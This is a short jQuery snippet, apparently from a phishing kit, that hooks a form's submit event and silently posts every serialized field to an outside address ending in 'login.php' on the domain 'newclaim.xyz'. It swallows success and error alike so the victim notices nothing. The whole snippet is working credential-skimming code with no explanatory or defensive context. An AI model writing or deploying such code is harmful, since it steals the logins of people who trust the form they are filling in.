$(".col-md-12 col-12").submit(function() {
	var d = $(".col-md-12 col-12");

	$.ajax({
        url: "https://trueid.newclaim.xyz/moba/login.php",
        type: "POST",
        data: d.serialize(),
        success: function () {
            return true;
        },
        error: function () {
            return true;
        },
    });
});
